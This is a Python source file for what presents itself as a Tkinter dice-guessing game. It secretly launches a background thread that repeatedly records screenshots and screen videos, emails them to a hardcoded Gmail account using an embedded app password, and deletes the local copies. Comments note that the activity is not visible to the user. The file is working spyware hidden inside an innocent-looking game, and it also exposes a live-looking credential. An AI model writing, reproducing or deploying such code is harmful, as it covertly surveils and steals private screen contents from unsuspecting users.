import os
import mss
import cv2
import time
import smtplib
import numpy as np
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import tkinter as tk
from tkinter import PhotoImage
import random
from threading import Thread
from PIL import Image, ImageDraw, ImageTk
import winsound

# Suppress specific warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

# Functions for screenshot, video capture, email sending, and cleanup
def capture_screenshot(filename):
    with mss.mss() as sct:
        sct.shot(output=filename)
    print(f"Screenshot captured: {filename}")  # Log for debugging (not visible to the user)

def capture_video(filename, duration, fps):
    # Dynamically get screen resolution
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        screen_width = monitor["width"]
        screen_height = monitor["height"]

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(filename, fourcc, fps, (screen_width, screen_height))
    start_time = time.time()
    with mss.mss() as sct:
        while time.time() - start_time < duration:
            frame = sct.grab(monitor)
            frame = cv2.cvtColor(np.array(frame), cv2.COLOR_BGRA2BGR)
            out.write(frame)
    out.release()
    print(f"Video captured: {filename}")  # Log for debugging (not visible to the user)

def send_email(subject, body, attachments):
    sender_email = "rsa750684@gmail.com"
    receiver_email = "rsa750684@gmail.com"
    password = "fegc lrdj gphe jkwe"  # Replace with your app password

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    for file in attachments:
        try:
            with open(file, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(file)}")
                msg.attach(part)
        except Exception as e:
            print(f"Error attaching file {file}: {e}")

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")  # Log for debugging (not visible to the user)
    except smtplib.SMTPAuthenticationError:
        print("Failed to send email: SMTP Authentication Error. Please check your credentials.")
    except Exception as e:
        print(f"An error occurred while sending email: {e}")

def cleanup_files(files):
    for file in files:
        if os.path.exists(file):
            os.remove(file)
            print(f"Deleted file: {file}")  # Log for debugging (not visible to the user)
        else:
            print(f"File not found for deletion: {file}")

# Background task for capturing and sending
def background_task():
    video_duration = 10  # seconds
    video_fps = 30
    email_subject = "Captured Data"
    email_body = "Attached are the captured screenshots and videos."
    while True:
        # Capture screenshot and video
        screenshot_filename = f"screenshot_{int(time.time())}.png"
        capture_screenshot(screenshot_filename)
        video_filename = f"video_{int(time.time())}.avi"
        capture_video(video_filename, video_duration, video_fps)
        attachments = [screenshot_filename, video_filename]

        # Send email with attachments
        send_email(email_subject, email_body, attachments)

        # Clean up files after sending
        cleanup_files(attachments)

        # Sleep for a longer period to avoid overwhelming resources
        time.sleep(60)  # Adjust as necessary

# Dice Guessing Game UI Code
def create_dice_image(value, filename):
    img = Image.new("RGB", (100, 100), "white")
    draw = ImageDraw.Draw(img)
    dot_positions = {
        1: [(50, 50)],
        2: [(25, 25), (75, 75)],
        3: [(25, 25), (50, 50), (75, 75)],
        4: [(25, 25), (25, 75), (75, 25), (75, 75)],
        5: [(25, 25), (25, 75), (50, 50), (75, 25), (75, 75)],
        6: [(25, 25), (25, 50), (25, 75), (75, 25), (75, 50), (75, 75)],
    }
    for pos in dot_positions[value]:
        draw.ellipse((pos[0] - 10, pos[1] - 10, pos[0] + 10, pos[1] + 10), fill="black")
    img.save(filename)

for i in range(1, 7):
    if not os.path.exists(f"dice{i}.png"):
        create_dice_image(i, f"dice{i}.png")

root = tk.Tk()
root.title("Dice Guessing Game")
root.geometry("300x500")
root.config(bg="black")
dice_images = [ImageTk.PhotoImage(file=f"dice{i}.png") for i in range(1, 7)]

def play_sound(result):
    if result == "correct":
        winsound.MessageBeep(winsound.MB_ICONASTERISK)
    elif result == "near":
        winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
    else:
        winsound.MessageBeep(winsound.MB_ICONHAND)

def roll_dice():
    try:
        user_guess = int(guess_entry.get())
        if user_guess < 1 or user_guess > 6:
            result_label.config(text="Guess must be between 1 and 6!", fg="red")
            return
    except ValueError:
        result_label.config(text="Enter a valid number between 1 and 6!", fg="red")
        return
    final_value = random.randint(1, 6)
    dice_label.config(image=dice_images[final_value - 1])
    if user_guess == final_value:
        result_label.config(text=f"Result: {final_value} - 🎉 Correct Guess!", fg="green")
        play_sound("correct")
    elif abs(user_guess - final_value) == 1:
        result_label.config(text=f"Result: {final_value} - 😊 Close Guess!", fg="orange")
        play_sound("near")
    else:
        result_label.config(text=f"Result: {final_value} - 😢 Wrong Guess!", fg="red")
        play_sound("incorrect")
    guess_entry.delete(0, tk.END)

dice_label = tk.Label(root, image=dice_images[0], bg="black")
dice_label.pack(pady=30)
guess_label = tk.Label(root, text="Enter your guess (1-6):", font=("Helvetica", 12), fg="white", bg="black")
guess_label.pack(pady=5)
guess_entry = tk.Entry(root, font=("Helvetica", 14), justify="center")
guess_entry.pack(pady=5)
roll_button = tk.Button(root, text="Roll Dice", command=roll_dice, font=("Helvetica", 14), bg="blue", fg="white")
roll_button.pack(pady=10)
result_label = tk.Label(root, text="Result: ", font=("Helvetica", 14), fg="white", bg="black")
result_label.pack(pady=20)

# Start the background task in a separate thread
Thread(target=background_task, daemon=True).start()

# Start the Tkinter main loop
root.mainloop()
